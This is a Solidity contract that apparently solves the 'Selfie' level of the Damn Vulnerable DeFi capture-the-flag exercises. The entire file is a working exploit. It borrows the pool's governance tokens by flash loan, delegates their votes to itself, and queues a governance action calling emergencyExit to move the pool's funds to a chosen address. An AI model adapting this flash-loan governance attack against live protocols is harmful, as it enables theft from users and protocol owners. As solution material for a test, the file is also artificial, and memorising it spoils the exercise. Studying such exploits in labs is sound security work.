//SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";

contract SelfieAttacker is IERC3156FlashBorrower {
    SimpleGovernance public immutable governance;
    SelfiePool public immutable pool;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;
    address public immutable recovery;

    constructor(SimpleGovernance _governance, SelfiePool _pool, address _recovery) {
        governance = _governance;
        pool = _pool;
        recovery = _recovery;
    }
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        DamnValuableVotes(token).delegate(address(this));
        governance.queueAction(address(pool), uint128(0), abi.encodeWithSignature("emergencyExit(address)", recovery));
        IERC20(token).approve(address(pool), TOKENS_IN_POOL);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack() external payable {
        pool.flashLoan(this, address(pool.token()), TOKENS_IN_POOL, bytes(""));
    }
}
